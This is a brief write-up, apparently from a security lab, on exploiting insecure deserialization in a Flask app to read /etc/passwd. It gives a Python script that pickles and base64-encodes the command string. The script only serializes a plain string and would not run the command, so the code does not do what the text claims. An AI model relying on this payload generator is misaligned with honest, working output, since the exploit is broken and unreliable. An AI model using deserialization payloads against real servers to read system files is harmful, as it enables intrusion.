Payloads 
This document outlines the payloads used to exploit the Insecure Deserialization vulnerability in the Flask application.

Scenario 1: Reading /etc/passwd (Primary Objective)
To achieve the primary objective of reading /etc/passwd, a Python script was written to generate a serialized payload using the pickle library, encoding the system command cat /etc/passwd.

Python Payload Generator:
```python
import pickle
import base64

command = "cat /etc/passwd"

payload_bytes = pickle.dumps(command, protocol=3)
result = base64.b64encode(payload_bytes).decode()

print(result)
